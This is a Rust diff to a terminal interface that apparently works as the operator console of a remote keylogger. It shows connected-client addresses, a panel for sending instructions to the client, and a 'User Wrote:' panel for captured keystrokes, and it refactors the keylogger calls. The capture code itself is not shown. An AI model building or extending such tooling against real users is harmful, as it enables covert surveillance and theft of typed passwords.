@@ -1,3 +1,7 @@
+use std::thread;
+use std::sync::mpsc;
+use std::time::Duration;
+
 use color_eyre::Result;
 use crossterm::event::{self, KeyCode};
 use ratatui::layout::{Constraint, Layout};
@@ -8,12 +12,16 @@ use ratatui::{DefaultTerminal, Frame};
 
 use super::Core;
 
+enum AppEvent {
+    Keylogger,
+    Render,
+}
+
 pub struct App {
     input: String,
     character_index: usize,
     messages: Vec<String>,
     instructions: Vec<String>,
-    keys: String,
     core: Core,
 }
 
@@ -24,7 +32,6 @@ impl App {
             messages: Vec::new(),
             instructions: Vec::new(),
             character_index: 0,
-            keys: String::new(),
             core: Core::new(),
         }
     }
@@ -75,14 +82,6 @@ impl App {
         self.character_index = 0;
     }
 
-    fn run_keylogger(&mut self) {
-        self.core.keylogger();
-    }
-
-    fn read_keys(&mut self) -> String {
-        self.core.keys.iter().map(|c| c.to_owned()).collect()
-    }
-
     fn submit_instructions(&mut self) {
         self.core.apply_instructions(self.input.clone()).unwrap();
         self.instructions.push(self.input.clone());
@@ -93,8 +92,6 @@ impl App {
 
     pub fn run(mut self, terminal: &mut DefaultTerminal) -> Result<()> {
         self.messages.push(format!("client is connected from {}", self.core.addr));
-
-        self.run_keylogger();
 
         loop {
             terminal.draw(|frame| self.render(frame))?;
@@ -109,6 +106,7 @@ impl App {
                     _ => {}
                 }
             }
+            thread::sleep(Duration::from_millis(16));
         }
     }
 
@@ -149,7 +147,7 @@ impl App {
             .block(Block::bordered());
         frame.render_widget(instructions, layout[1]);
 
-        let keylogger = Paragraph::new(format!("User Wrote: {}", self.read_keys()))
+        let keylogger = Paragraph::new(format!("User Wrote:"))
             .style(Style::default().fg(Color::White))
             .block(Block::bordered());
         frame.render_widget(keylogger, layout[0]);
